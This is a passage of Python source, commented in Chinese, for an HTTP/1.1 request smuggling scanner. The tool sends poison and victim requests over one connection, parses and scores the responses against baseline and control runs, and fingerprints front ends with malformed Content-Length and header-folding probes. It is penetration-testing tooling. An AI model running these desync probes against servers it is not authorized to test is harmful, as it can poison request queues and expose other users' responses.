            picked.append(by_key[part])
    return picked or pool


# ─── HTTP/1.1 响应边界解析（P0-3 / P1-11）────────────────────────────────────
@dataclass
class ParsedResponse:
    status: str
    reason: str
    version: str
    headers: list            # list[tuple[bytes, bytes]]，头名小写
    body: bytes
    start: int
    end: int                 # 不含
    framing: str             # content-length / chunked / eof / none
    complete: bool

    def header(self, name: bytes) -> Optional[bytes]:
        for k, v in self.headers:
            if k == name.lower():
                return v
        return None


_STATUS_RE = re.compile(rb'HTTP/(\d(?:\.\d)?)[ \t](\d{3})(?:[ \t](.*))?$')


def parse_chunked_at(stream: bytes, pos: int) -> tuple:
    """→ (end_pos|None, state, decoded_body)，state ∈ complete / incomplete / malformed"""
    n = len(stream)
    decoded = bytearray()
    while True:
        line_end = stream.find(CRLF, pos)
        if line_end == -1:
            return None, 'incomplete', bytes(decoded)
        token = stream[pos:line_end].split(b';')[0].strip()
        try:
            size = int(token, 16)
        except ValueError:
            return None, 'malformed', bytes(decoded)
        if size == 0:
            p = line_end + 2
            while True:
                le = stream.find(CRLF, p)
                if le == -1:
                    return None, 'incomplete', bytes(decoded)
                if le == p:
                    return le + 2, 'complete', bytes(decoded)
                p = le + 2
        data_start = line_end + 2
        data_end = data_start + size
        if data_end + 2 > n:
            return None, 'incomplete', bytes(decoded)
        if stream[data_end:data_end + 2] != CRLF:
            return None, 'malformed', bytes(decoded)
        decoded += stream[data_start:data_end]
        pos = data_end + 2


def parse_responses(stream: bytes, saw_eof: bool = False) -> tuple:
    """顺序切分响应流 → (list[ParsedResponse], trailing_partial_bytes)"""
    responses = []
    pos, n = 0, len(stream)
    while pos < n:
        while stream.startswith(CRLF, pos):
            pos += 2
        if pos >= n:
            break
        head_end = stream.find(CRLF + CRLF, pos)
        if head_end == -1:
            return responses, stream[pos:]
        head = stream[pos:head_end]
        lines = head.split(CRLF)
        m = _STATUS_RE.match(lines[0])
        if not m:
            return responses, stream[pos:]
        version = m.group(1).decode('ascii')
        status = m.group(2).decode('ascii')
        reason = (m.group(3) or b'').decode('latin-1')
        headers = []
        for ln in lines[1:]:
            i = ln.find(b':')
            if i == -1:
                continue
            headers.append((ln[:i].strip().lower(), ln[i + 1:].strip()))
        hdict = {}
        for k, v in headers:
            hdict.setdefault(k, v)
        body_start = head_end + 4

        if status.startswith('1') or status in ('204', '304'):
            responses.append(ParsedResponse(status, reason, version, headers,
                                             b'', pos, body_start, 'none', True))
            pos = body_start
            continue

        te = hdict.get(b'transfer-encoding', b'')
        cl_raw = hdict.get(b'content-length')
        if te and b'chunked' in te.lower():
            end, state, decoded = parse_chunked_at(stream, body_start)
            if state == 'complete':
                responses.append(ParsedResponse(status, reason, version, headers,
                                                 decoded, pos, end, 'chunked', True))
                pos = end
                continue
            # incomplete / malformed：保留该响应条目（complete=False），否则超时分类失真
            responses.append(ParsedResponse(status, reason, version, headers,
                                             stream[body_start:], pos, n,
                                             'chunked', False))
            return responses, b''
        if cl_raw is not None:
            try:
                length = int(cl_raw)
            except ValueError:
                length = None
            if length is not None:
                body_end = body_start + length
                complete = body_end <= n
                responses.append(ParsedResponse(
                    status, reason, version, headers,
                    stream[body_start:min(body_end, n)], pos,
                    body_end if complete else n, 'content-length', complete))
                if not complete:
                    return responses, b''
                pos = body_end
                continue
        responses.append(ParsedResponse(status, reason, version, headers,
                                         stream[body_start:], pos, n, 'eof', saw_eof))
        return responses, b''
    return responses, b''


# ─── 分相读取（P1-12：四态可区分）────────────────────────────────────────────
@dataclass
class ReadOutcome:
    data: bytes
    end_reason: EndReason
    ttfb: Optional[float]
    read_ms: float
    error: Optional[str] = None


def classify_timeout(buf: bytes, got_first_byte: bool) -> EndReason:
    responses, trailing = parse_responses(buf, saw_eof=False)
    if not got_first_byte or not buf:
        return EndReason.FIRST_BYTE_TIMEOUT
    if not responses or trailing:
        return EndReason.HEADER_TIMEOUT
    if not responses[-1].complete:
        return EndReason.BODY_TIMEOUT
    return EndReason.IDLE_AFTER_COMPLETE


def read_http(sock: socket.socket, ttfb_timeout: float, phase_timeout: float,
              size_limit: int) -> ReadOutcome:
    buf = bytearray()
    ttfb = None
    error = None
    reason = None
    start = time.monotonic()
    sock.settimeout(ttfb_timeout)
    try:
        while True:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                reason = classify_timeout(bytes(buf), ttfb is not None)
                break
            if not chunk:
                reason = EndReason.EOF
                break
            if ttfb is None:
                ttfb = time.monotonic() - start
                sock.settimeout(phase_timeout)
            buf += chunk
            if len(buf) >= size_limit:
                reason = EndReason.SIZE_LIMIT
                break
    except OSError as e:
        # 含 ssl.SSLError / ECONNRESET，保留已收数据。
        # P0-2：Py<3.10 的 SSLSocket 读超时抛 ssl.SSLError('... timed out')
        # 而非 socket.timeout —— 必须按超时归因，否则 TLS 目标上
        # DIFF_HANG 永不触发、且被错记为 CONN_KILLED
        if isinstance(e, socket.timeout) or 'timed out' in str(e).lower():
            reason = classify_timeout(bytes(buf), ttfb is not None)
        else:
            error = f'{type(e).__name__}: {e}'
            reason = EndReason.ERROR
    return ReadOutcome(bytes(buf), reason or EndReason.EOF, ttfb,
                       (time.monotonic() - start) * 1000.0, error)


# ─── 基线分布（P1-9：多采样）─────────────────────────────────────────────────
@dataclass
class BaselineSample:
    status: Optional[str]
    size: int
    elapsed_ms: float
    end_reason: Optional[EndReason]
    error: Optional[str] = None
    raw: bytes = b''


@dataclass
class BaselineDistribution:
    samples: list

    @property
    def ok(self) -> bool:
        return any(s.error is None for s in self.samples)

    @property
    def statuses(self) -> set:
        return {s.status for s in self.samples if s.error is None and s.status}

    @property
    def size_range(self) -> tuple:
        sizes = [s.size for s in self.samples if s.error is None]
        return (min(sizes), max(sizes)) if sizes else (0, 0)

    def size_in_range(self, n: int, margin: int = 50) -> bool:
        lo, hi = self.size_range
        return lo - margin <= n <= hi + margin

    def contains_token(self, token: bytes) -> bool:
        return any(token in s.raw for s in self.samples)


def collect_baseline(target: Target, cfg: ProbeConfig) -> BaselineDistribution:
    samples = []
    for _ in range(cfg.baseline_samples):
        req = build_get(target.host_header, target.path)
        t0 = time.monotonic()
        try:
            sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout)
            sock.settimeout(cfg.phase_timeout)
            sock.sendall(req)
            outcome = read_http(sock, cfg.ttfb_timeout, cfg.phase_timeout, cfg.size_limit)
            sock.close()
            parsed, _ = parse_responses(outcome.data,
                                        saw_eof=(outcome.end_reason == EndReason.EOF))
            status = parsed[0].status if parsed else None
            samples.append(BaselineSample(status, len(outcome.data),
                                          (time.monotonic() - t0) * 1000.0,
                                          outcome.end_reason, None, outcome.data))
        except OSError as e:
            samples.append(BaselineSample(None, 0, (time.monotonic() - t0) * 1000.0,
                                          None, f'{type(e).__name__}: {e}'))
    return BaselineDistribution(samples)


# ─── H1 探测记录与轮分析 ──────────────────────────────────────────────────────
@dataclass
class Timeline:
    started_at: float
    connect_ms: float = 0.0
    tls_ms: float = 0.0
    send_poison_ms: float = 0.0
    wait_delay_ms: float = 0.0
    send_victim_ms: float = 0.0
    ttfb_ms: Optional[float] = None
    read_ms: float = 0.0
    total_ms: float = 0.0


@dataclass
class ProbeRecord:
    probe_id: str
    technique: str
    mode: str
    round_no: int
    marker_token: str
    victim_token: str
    poison: bytes
    victim: bytes
    outcome: ReadOutcome
    parsed: list
    timeline: Timeline
    analysis: Optional[RoundAnalysis] = None


def analyze_round(rec: ProbeRecord, baseline: BaselineDistribution,
                  control: Optional[ControlResult]) -> RoundAnalysis:
    ev = []
    parsed = rec.parsed
    statuses = [p.status for p in parsed]
    marker_b = rec.marker_token.encode('ascii')
    victim_b = rec.victim_token.encode('ascii')

    def token_seen(tok: bytes) -> bool:
        return any(tok in p.body or tok in (p.header(b'location') or b'')
                   for p in parsed)

    # ① marker 响应：仅认语义位置 —— Location 头，或第 2 个及以后的响应体。
    #    P1-b 回显防护：错误页回显原始请求时几乎必含分帧/头域签名，命中即排除
    #    （definitive w8 证据必须保守；正常业务页出现这些字面量的概率极低）
    echo_signatures = (b'Transfer-Encoding', b'Content-Length', b'chunked',
                       b'Host:', b'HTTP/1.1')
    marker_hit = False
    if not baseline.contains_token(marker_b):
        for idx, p in enumerate(parsed):
            if marker_b in (p.header(b'location') or b''):
                marker_hit = True
                break
            if (idx >= 1 and marker_b in p.body
                    and not any(sig in p.body for sig in echo_signatures)):
                marker_hit = True
                break
    if marker_hit:
        ev.append(Evidence(EV_MARKER, 'marker 路径出现在第 2+ 响应体(非回显)或 Location 头'))

    control_ok = bool(control and control.ok)

    # ② 响应数偏离对照（正常管线也返回 2 个响应，必须与对照差分）。
    #    P1-a：对照不可用时不再退化为猜测值 2 —— 会话层已对对照失败弃权，
    #    此处仅在 control_ok 时判定，避免无对照差分的假阳性
    if control_ok and len(parsed) > control.response_count:
        ev.append(Evidence(EV_QUEUE_SHIFT,
                           f'响应数 {len(parsed)} > 对照 {control.response_count}'))

    # ③ 差分挂起：毒包超时（任意相）而对照正常完成 —— 单纯超时无对照不算证据
    hang_reasons = (EndReason.FIRST_BYTE_TIMEOUT, EndReason.HEADER_TIMEOUT,
                    EndReason.BODY_TIMEOUT)
    control_complete = control_ok and control.end_reason in (
        EndReason.EOF, EndReason.IDLE_AFTER_COMPLETE)
    if rec.outcome.end_reason in hang_reasons and control_complete:
        ev.append(Evidence(EV_DIFF_HANG,
                           f'毒包 {rec.outcome.end_reason.value} 而对照正常完成'))

    # ④ victim 响应被吞：仅当全程无任何拒绝码时才成立。
    #    P1-a：服务器正当拒绝畸形/粘连请求（任意位置 400/502/503）后不再响应
    #    victim 属预期行为，不计证据 —— 旧版只查首响应，第 2 响应 400 可绕过
    no_rejection = bool(statuses) and all(s not in BAD_CODES for s in statuses)
    if (control_ok and control.victim_token_seen and no_rejection
            and not token_seen(victim_b)):
        ev.append(Evidence(EV_VICTIM_MISSING,
                           'victim 路径未出现在任何响应中(全程无拒绝码)'))

    # ⑤ 连接被杀：毒包后 ERROR / 零响应 EOF，而对照有响应
    killed = (rec.outcome.end_reason == EndReason.ERROR
              or (rec.outcome.end_reason == EndReason.EOF and not parsed))
    if killed and control_ok and control.response_count > 0:
        ev.append(Evidence(EV_CONN_KILLED,
                           f'连接终止({rec.outcome.end_reason.value})，对照正常'))

    # ⑥⑦⑧ 弱证据：仅在与基线/对照比较成立时记 1 分，任何组合都无法单独推至 HIGH
    ref_statuses = set(baseline.statuses) if baseline.ok else set()
    if control_ok:
        ref_statuses |= control.statuses
    if baseline.ok and statuses and statuses[0] not in ref_statuses:
        ev.append(Evidence(EV_STATUS_ANOMALY,
                           f'首响应 {statuses[0]} 不在基线/对照分布 {sorted(ref_statuses)}'))
    # ⑦ 错误码：毒包已被接受（首响应正常）后才计 —— 首响应即 4xx 属正当拒绝
    bad_here = set(statuses) & BAD_CODES
    if (bad_here and control_ok
            and not (set(control.statuses) & BAD_CODES)
            and statuses and statuses[0] not in BAD_CODES):
        ev.append(Evidence(EV_ERROR_CODE, f'出现 {sorted(bad_here)} 且对照无'))
    if baseline.ok and baseline.size_range != (0, 0) and \
            not baseline.size_in_range(len(rec.outcome.data)):
        lo, hi = baseline.size_range
        ev.append(Evidence(EV_SIZE_ANOMALY,
                           f'响应 {len(rec.outcome.data)}B 超出基线范围 {lo}-{hi}B'))

    score = sum(EV_WEIGHTS[e.code] for e in ev)
    if any(e.code in EV_DEFINITIVE for e in ev):
        confidence = 'HIGH'
    elif score >= 4:
        confidence = 'MEDIUM'
    else:
        confidence = 'LOW'
    return RoundAnalysis(ev, score, confidence, statuses, rec.outcome.end_reason)


# ─── 探测执行 ─────────────────────────────────────────────────────────────────
def build_control_poison(host: bytes, path: bytes) -> bytes:
    body = b'q=smuggle-control-probe'
    return _post_head(host, path, len(body), b'') + body


def run_control(target: Target, cfg: ProbeConfig, victim_token: str) -> ControlResult:
    victim_path = child_path(target.path, victim_token)
    poison = build_control_poison(target.host_header, target.path)
    victim = build_get(target.host_header, victim_path)
    try:
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout)
        sock.settimeout(cfg.phase_timeout)
        sock.sendall(poison)
        time.sleep(cfg.delay)
        sock.sendall(victim)
        outcome = read_http(sock, cfg.ttfb_timeout, cfg.phase_timeout, cfg.size_limit)
        sock.close()
    except OSError as e:
        return ControlResult(False, None, 0, set(), False, f'{type(e).__name__}: {e}')
    parsed, _ = parse_responses(outcome.data,
                                saw_eof=(outcome.end_reason == EndReason.EOF))
    tok = victim_token.encode('ascii')
    seen = any(tok in p.body or tok in (p.header(b'location') or b'') for p in parsed)
    ok = outcome.end_reason in (EndReason.EOF, EndReason.IDLE_AFTER_COMPLETE) and bool(parsed)
    return ControlResult(ok, outcome.end_reason, len(parsed),
                         {p.status for p in parsed}, seen)


def run_control_retried(target: Target, cfg: ProbeConfig,
                        victim_token: str) -> ControlResult:
    """P1-c：对照失败自动重试；仍失败由会话层弃权该技术组合，不再退化为猜测值。"""
    result = None
    for _ in range(max(1, cfg.control_retries)):
        result = run_control(target, cfg, victim_token)
        if result.ok:
            return result
    return result


def run_probe(target: Target, cfg: ProbeConfig, probe_id: str, tech_name: str,
              mode: str, round_no: int, marker_token: str, victim_token: str,
              poison: bytes, victim: bytes) -> ProbeRecord:
    tl = Timeline(started_at=time.time())
    t0 = time.monotonic()
    try:
        sock, tl.connect_ms, tl.tls_ms = open_connection(
            target, cfg.insecure, cfg.connect_timeout)
    except OSError as e:
        outcome = ReadOutcome(b'', EndReason.ERROR, None, 0.0,
                              f'connect: {type(e).__name__}: {e}')
        return ProbeRecord(probe_id, tech_name, mode, round_no, marker_token,
                           victim_token, poison, victim, outcome, [], tl)
    try:
        t1 = time.monotonic()
        sock.sendall(poison)
        tl.send_poison_ms = (time.monotonic() - t1) * 1000.0
        time.sleep(cfg.delay)
        tl.wait_delay_ms = cfg.delay * 1000.0
        t2 = time.monotonic()
        sock.sendall(victim)
        tl.send_victim_ms = (time.monotonic() - t2) * 1000.0
        outcome = read_http(sock, cfg.ttfb_timeout, cfg.phase_timeout, cfg.size_limit)
        tl.ttfb_ms = outcome.ttfb * 1000.0 if outcome.ttfb is not None else None
        tl.read_ms = outcome.read_ms
    except OSError as e:
        outcome = ReadOutcome(b'', EndReason.ERROR, None, 0.0,
                              f'send/read: {type(e).__name__}: {e}')
    finally:
        sock.close()
    tl.total_ms = (time.monotonic() - t0) * 1000.0
    parsed, _ = parse_responses(outcome.data,
                                saw_eof=(outcome.end_reason == EndReason.EOF))
    return ProbeRecord(probe_id, tech_name, mode, round_no, marker_token,
                       victim_token, poison, victim, outcome, parsed, tl)


# ─── H1 工件落盘 ─────────────────────────────────────────────────────────────
class H1Artifacts(Artifacts):
    def save_probe(self, rec: ProbeRecord) -> None:
        analysis = rec.analysis
        self._line({
            'ts': rec.timeline.started_at, 'probe_id': rec.probe_id,
            'technique': rec.technique, 'mode': rec.mode, 'round': rec.round_no,
            'marker': rec.marker_token, 'victim': rec.victim_token,
            'layer': 'h1',
            'end_reason': rec.outcome.end_reason.value,
            'statuses': rec.analysis.statuses if analysis else [],
            'evidence': [e.code for e in analysis.evidences] if analysis else [],
            'score': analysis.score if analysis else 0,
            'confidence': analysis.confidence if analysis else 'LOW',
            'timeline_ms': {
                'connect': round(rec.timeline.connect_ms, 1),
                'tls': round(rec.timeline.tls_ms, 1),
                'send_poison': round(rec.timeline.send_poison_ms, 1),
                'wait': round(rec.timeline.wait_delay_ms, 1),
                'send_victim': round(rec.timeline.send_victim_ms, 1),
                'ttfb': round(rec.timeline.ttfb_ms, 1) if rec.timeline.ttfb_ms is not None else None,
                'read': round(rec.timeline.read_ms, 1),
                'total': round(rec.timeline.total_ms, 1),
            },
        })
        parts = [
            f'probe_id : {rec.probe_id}',
            f'tech/mode/round : {rec.technique} / {rec.mode} / {rec.round_no}',
            f'marker / victim : {rec.marker_token} / {rec.victim_token}',
            f'end_reason : {rec.outcome.end_reason.value}'
            + (f'  ({rec.outcome.error})' if rec.outcome.error else ''),
            f'timeline_ms : connect={rec.timeline.connect_ms:.1f} tls={rec.timeline.tls_ms:.1f}'
            f' send_poison={rec.timeline.send_poison_ms:.1f} wait={rec.timeline.wait_delay_ms:.1f}'
            f' send_victim={rec.timeline.send_victim_ms:.1f}'
            f' ttfb={rec.timeline.ttfb_ms} read={rec.timeline.read_ms:.1f}'
            f' total={rec.timeline.total_ms:.1f}',
            '', '--- POISON (raw) ---', repr(rec.poison),
            '', '--- VICTIM (raw) ---', repr(rec.victim),
            '', '--- RESPONSE (raw) ---', repr(rec.outcome.data),
            '', '--- RESPONSE (decoded) ---', _dec(rec.outcome.data) or '(empty)',
            '', f'--- PARSED ({len(rec.parsed)} responses) ---',
        ]
        for i, p in enumerate(rec.parsed):
            parts.append(f'#{i} {p.version} {p.status} {p.reason} '
                         f'framing={p.framing} complete={p.complete} '
                         f'body={len(p.body)}B headers={len(p.headers)}')
        if analysis:
            parts.append('')
            parts.append(f'--- EVIDENCE (score {analysis.score} → {analysis.confidence}) ---')
            for e in analysis.evidences:
                parts.append(f'  [{EV_WEIGHTS[e.code]:>2}] {e.code}: {e.detail}')
        (self.raw_dir / (rec.probe_id + '.txt')).write_text(
            '\n'.join(parts), encoding='utf-8')


# ─── H1 会话 ─────────────────────────────────────────────────────────────────
def _round_line(rec: ProbeRecord) -> str:
    a = rec.analysis
    codes = ', '.join(f'{e.code}({EV_WEIGHTS[e.code]})' for e in a.evidences) or '无'
    return (f'[{rec.mode}/r{rec.round_no}] {len(rec.parsed)} resp '
            f'{tuple(a.statuses)} | {rec.outcome.end_reason.value} | '
            f'ttfb={rec.timeline.ttfb_ms}ms total={rec.timeline.total_ms:.0f}ms | '
            f'证据: {codes} → score {a.score} → {a.confidence}')


def run_h1_session(target: Target, cfg: ProbeConfig, techniques: list,
                   artifacts: Artifacts, baseline: BaselineDistribution) -> list:
    verdicts = []
    for tech in techniques:
        for mode in modes_of(cfg, tech):
            control = run_control_retried(target, cfg, gen_victim_token())
            if not control.ok:
                # P1-c：对照重试仍失败 → 弃权该组合（无对照差分的证据不可信，
                # 旧版在此退化为猜测值 expected_count=2，会引入假阳性）
                why = control.error or (control.end_reason.value
                                        if control.end_reason else 'unknown')
                print(f'\n==> {tech.name}/{mode}  对照 {cfg.control_retries} 次尝试均失败，'
                      f'该组合弃权({why})')
                artifacts.log_event({'ts': time.time(), 'layer': 'h1',
                                     'event': 'abstain_control_failed',
                                     'technique': tech.name, 'mode': mode,
                                     'attempts': cfg.control_retries, 'reason': why})
                continue
            print(f'\n==> {tech.name}/{mode}  对照: ok={control.ok} '
                  f'resp={control.response_count} statuses={sorted(control.statuses)}')
            rounds = []
            records = []
            for i in range(cfg.rounds):
                seq = secrets.token_hex(4)
                probe_id = f'{tech.key.replace(":", "_")}-{mode}-r{i + 1}-{seq}'
                marker_token, victim_token = gen_marker_token(), gen_victim_token()
                victim = build_get(target.host_header,
                                   child_path(target.path, victim_token))
                ctx = BuildContext(host=target.host_header, path=target.path,
                                   mode=mode,
                                   marker_path=child_path(target.path, marker_token),
                                   victim=victim)
                rec = run_probe(target, cfg, probe_id, tech.name, mode, i + 1,
                                marker_token, victim_token, tech.build(ctx), victim)
                rec.analysis = analyze_round(rec, baseline, control)
                artifacts.save_probe(rec)
                print(f'  {_round_line(rec)}')
                rounds.append(rec.analysis)
                records.append(rec)
            verdict = aggregate_technique(tech.name, mode, rounds, cfg.repro_threshold)
            if records:
                verdict.best_record = max(
                    records, key=lambda r: (r.analysis.has_definitive, r.analysis.score))
            repro_txt = ', '.join(f'{c} {h}/{n}' for c, (h, n) in verdict.evidence_repro.items()) or '无'
            print(f'>>> {verdict.verdict} | 复现率: {repro_txt}')
            verdicts.append((tech, verdict))
    return verdicts


# ─── 指纹模块（V3.2，informational，不参与评分）──────────────────────────────
HEADER_PROBES = [
    ('space-before-colon', b'X-Normprobe : v'),
    ('tab-before-colon',   b'X-Normprobe\t: v'),
    ('space-after-colon',  b'X-Normprobe:  v'),
    ('obs-fold-space',     b'X-Normprobe: v\r\n w'),
    ('mixed-case-name',    b'x-NoRmPrObE: v'),
    ('underscore-name',    b'X_Normprobe: v'),
    ('duplicate-header',   b'X-Normprobe: a\r\nX-Normprobe: b'),
    ('invalid-cl',         b'Content-Length: abc'),
    ('cl-plus',            b'Content-Length: +5'),
    ('cl-comma',           b'Content-Length: 5, 5'),
    ('cl-leading-zero',    b'Content-Length: 007'),
    ('cl-negative',        b'Content-Length: -1'),
]


def _fp_probe(target: Target, cfg: ProbeConfig, request: bytes) -> dict:
    """单连接发送一个探测请求，返回结构化结果。"""
    try:
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout)
        sock.settimeout(cfg.phase_timeout)
        sock.sendall(request)
        outcome = read_http(sock, cfg.ttfb_timeout, cfg.phase_timeout, cfg.size_limit)
        sock.close()
    except OSError as e:
        return {'status': None, 'end': 'error', 'error': f'{type(e).__name__}: {e}',
                'headers': {}, 'body_len': 0}
    parsed, _ = parse_responses(outcome.data,
                                saw_eof=(outcome.end_reason == EndReason.EOF))
    first = parsed[0] if parsed else None
    headers = {}
    if first:
        for k, v in first.headers:
            headers.setdefault(_dec(k), _dec(v))
    return {'status': first.status if first else None,
            'end': outcome.end_reason.value, 'error': outcome.error,
            'headers': headers,
            'body': first.body if first else b'',
            'body_len': len(first.body) if first else 0}


def run_fingerprint(target: Target, cfg: ProbeConfig,
                    alpn: Optional[str]) -> dict:
    """前端行为指纹：Server/Via、请求头规范化矩阵、压缩解码对比、管线支持性。"""
    fp = {'alpn': alpn, 'server_headers': {}, 'header_normalization': [],
          'encoding': [], 'pipeline': None}

    base = _fp_probe(target, cfg,
                     build_get(target.host_header, target.path))
    interesting = ('server', 'via', 'x-powered-by', 'x-cache', 'x-served-by',
                   'cf-ray', 'x-amz-cf-id', 'x-vercel-id', 'x-github-request-id')
    fp['server_headers'] = {k: v for k, v in base.get('headers', {}).items()
                            if k in interesting}

    for name, line in HEADER_PROBES:
        req = (b'GET ' + target.path + b' HTTP/1.1\r\nHost: ' + target.host_header +
               b'\r\n' + line + b'\r\nConnection: close\r\n\r\n')
        r = _fp_probe(target, cfg, req)
        fp['header_normalization'].append({
            'probe': name, 'status': r['status'], 'end': r['end'],
            'error': r['error']})

    for ae in ('identity', 'gzip', 'br', 'deflate'):
        req = (b'GET ' + target.path + b' HTTP/1.1\r\nHost: ' + target.host_header +
               b'\r\nAccept-Encoding: ' + ae.encode('ascii') +
               b'\r\nConnection: close\r\n\r\n')
        r = _fp_probe(target, cfg, req)
        ce = r.get('headers', {}).get('content-encoding', '')
        body = r.get('body', b'')
        decoded_len, decoded_ok = None, False
        if ce == 'gzip' and body:
            try:
                decoded_len = len(zlib.decompress(body, 16 + zlib.MAX_WBITS))
                decoded_ok = True
            except zlib.error:
                decoded_ok = False
        fp['encoding'].append({
            'ae': ae, 'status': r['status'], 'content_encoding': ce,
            'body_len': r['body_len'], 'decoded_len': decoded_len,
            'decoded_ok': decoded_ok})

    # 管线支持性：同连接背靠背两个 keep-alive GET
    get_ka = (b'GET ' + target.path + b' HTTP/1.1\r\nHost: ' + target.host_header +
              b'\r\nConnection: keep-alive\r\n\r\n')
    try:
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout)
        sock.settimeout(cfg.phase_timeout)
        sock.sendall(get_ka + get_ka)
        outcome = read_http(sock, cfg.ttfb_timeout, cfg.phase_timeout, cfg.size_limit)
        sock.close()
        parsed, _ = parse_responses(outcome.data,
                                    saw_eof=(outcome.end_reason == EndReason.EOF))
        fp['pipeline'] = {'responses': len(parsed),
                          'end': outcome.end_reason.value}
    except OSError as e:
        fp['pipeline'] = {'responses': 0, 'end': 'error',
                          'error': f'{type(e).__name__}: {e}'}
    return fp


def print_fingerprint(fp: dict) -> None:
    lines = []
    sh = fp.get('server_headers') or {}
    lines.append(f"ALPN: {fp.get('alpn') or 'N/A'}   "
                 f"前端头指纹: {sh if sh else '(未观察到特征头)'}")
    lines.append('请求头规范化矩阵 (informational，不参与评分):')
    for row in fp.get('header_normalization', []):
        lines.append(f"  {row['probe']:<20} status={str(row['status'] or '-'):>4}  "
                     f"end={row['end']}")
    enc = fp.get('encoding', [])
    if enc:
        lines.append('压缩解码对比:')
        for row in enc:
            dec = (f"decoded={row['decoded_len']}B ok={row['decoded_ok']}"
                   if row['decoded_len'] is not None else '')
            lines.append(f"  AE={row['ae']:<9} status={str(row['status'] or '-'):>4} "
                         f"ce={row['content_encoding'] or '-':<8} "
                         f"body={row['body_len']}B {dec}")
    pl = fp.get('pipeline') or {}
    lines.append(f"管线支持性: 同连接双 GET → {pl.get('responses', 0)} 个响应 "
                 f"(end={pl.get('end')})")
    section('前端指纹 (informational)', '\n'.join(lines))


# ─── 主流程 ───────────────────────────────────────────────────────────────────
def main(argv=None) -> int:
    # P1-d：Windows GBK 控制台/重定向下，非 ASCII 输出会抛 UnicodeEncodeError
    # 并中断后续流程（含报告落盘）—— 统一切换 UTF-8 + replace
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding='utf-8', errors='replace')
        except (AttributeError, ValueError, OSError):
            pass
    ap = argparse.ArgumentParser(
        description='HTTP/1.1 请求走私探测工具（CL.TE/TE.CL/CL.CL/TE.TE，仅供授权测试）')
    ap.add_argument('--url', help='探测目标 URL（缺省进入交互模式）')
    ap.add_argument('--tech', default='all',
                    help='技术标识（逗号分隔）或 all；交互模式下回车选择全部')
    ap.add_argument('--te-te-tier', choices=['A', 'AB', 'ABC'], default='ABC',
                    help='TE.TE 变体分级过滤：A=结构性混淆 AB=+值混淆 ABC=全部')
    ap.add_argument('--mode', choices=['both', 'hang', 'shift'], default='both')
    ap.add_argument('--rounds', type=int, default=3)
    ap.add_argument('--baseline-samples', type=int, default=3)
    ap.add_argument('--delay', type=float, default=0.5)
    ap.add_argument('--ttfb-timeout', type=float, default=4.0)
    ap.add_argument('--phase-timeout', type=float, default=4.0)
    ap.add_argument('--connect-timeout', type=float, default=10.0)
    ap.add_argument('--size-limit', type=int, default=1048576)
    ap.add_argument('--repro-threshold', type=int, default=2,
                    help='definitive 证据升级 HIGH 所需复现轮数')
    ap.add_argument('--control-retries', type=int, default=2,
                    help='对照探测总尝试次数(>=1；仍失败则弃权该技术组合)')
    ap.add_argument('--out', default='smuggle_out_h1')
    ap.add_argument('--insecure', action='store_true',
                    help='跳过 TLS 证书与主机名校验（默认开启校验）')
    ap.add_argument('--no-fingerprint', action='store_true',
                    help='关闭指纹模块（默认开启，informational 不参与评分）')
    ap.add_argument('--list-tech', action='store_true')
    args = ap.parse_args(argv)

    if args.list_tech:
        for t in TECHNIQUES:
            tier_tag = f'[tier {t.tier}]' if t.tier != '-' else ''
            print(f'{t.key:<32} {t.name:<30} {tier_tag:<10} {t.description}')
        return 0

    if args.url:
        try:
            target = parse_target(args.url)
        except ValueError as e:
            print(f'[!] 目标解析失败: {e}')
            return 1
        techniques = select_techniques(args.tech, args.te_te_tier)
    else:
        raw = input(f'输入探测目标 URL（回车使用默认 {DEFAULT_TARGET}）: ')
        try:
            target = parse_target(raw)
        except ValueError as e:
            print(f'[!] 目标解析失败: {e}')
            return 1
        techniques = select_techniques_interactive(args.te_te_tier)

    try:
        cfg = ProbeConfig(
            rounds=args.rounds, baseline_samples=args.baseline_samples,
            mode=args.mode, protocol='h1', te_tier=args.te_te_tier,
            fingerprint=not args.no_fingerprint,
            connect_timeout=args.connect_timeout,
            ttfb_timeout=args.ttfb_timeout, phase_timeout=args.phase_timeout,
            delay=args.delay, size_limit=args.size_limit, insecure=args.insecure,
            repro_threshold=args.repro_threshold,
            control_retries=args.control_retries, out_dir=Path(args.out),
        )
    except ValueError as e:
        print(f'[!] 参数非法: {e}')
        return 2

    alpn = probe_alpn(target, cfg)

    print('HTTP/1.1 Request Smuggling 探测工具（仅供授权渗透测试使用）')
    print(f'目标 : {target.host}:{target.port} (TLS={target.use_tls} '
          f'ALPN={alpn or "N/A"} 校验={"关闭" if cfg.insecure else "开启"})')
    print(f'路径 : {_dec(target.path)}   Host 头: {_dec(target.host_header)}')
    print(f'技术 : H1×{len(techniques)} | '
          f'模式 {cfg.mode} × {cfg.rounds} 轮 | TE.TE tier {cfg.te_tier}')

    artifacts = H1Artifacts(cfg.out_dir)

    fingerprint = None
    if cfg.fingerprint:
        try:
            fingerprint = run_fingerprint(target, cfg, alpn)
            print_fingerprint(fingerprint)
        except KeyboardInterrupt:
            raise
        except Exception as e:                     # 指纹失败不阻断主探测
            print(f'[i] 指纹模块异常（忽略）: {type(e).__name__}: {e}')

    try:
        baseline = collect_baseline(target, cfg)
        bl = baseline.size_range
        print(f'\n基线分布: {cfg.baseline_samples} 采样 | '
              f'状态码 {sorted(baseline.statuses) or "?"}'
              f' | 长度 {bl[0]}-{bl[1]}B | 可用={baseline.ok}')
        verdicts = run_h1_session(target, cfg, techniques, artifacts, baseline)
    except KeyboardInterrupt:
        print('\n[!] 用户中断')
        return 130

    # P1-d：报告先落盘 —— 后续任何控制台打印异常都不会丢失本场结果
    report = build_report(target, cfg, verdicts, alpn=alpn,
                          fingerprint=fingerprint, baseline=baseline,
                          version='V3.3-h1')
    artifacts.save_report(report)

    order = {'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
    lines = []
    for _, v in sorted(verdicts, key=lambda x: -order.get(x[1].confidence, 0)):
        repro = ', '.join(f'{c} {h}/{n}' for c, (h, n) in v.evidence_repro.items()) or '-'
        lines.append(f'[{v.confidence:<6}] {v.technique}/{v.mode:<5} {repro:<30} {v.verdict}')
    section('全技术综合汇总', '\n'.join(lines))

    if verdicts:
        best = max(verdicts, key=lambda x: (order.get(x[1].confidence, 0),
                                            max((r.score for r in x[1].rounds), default=0)))
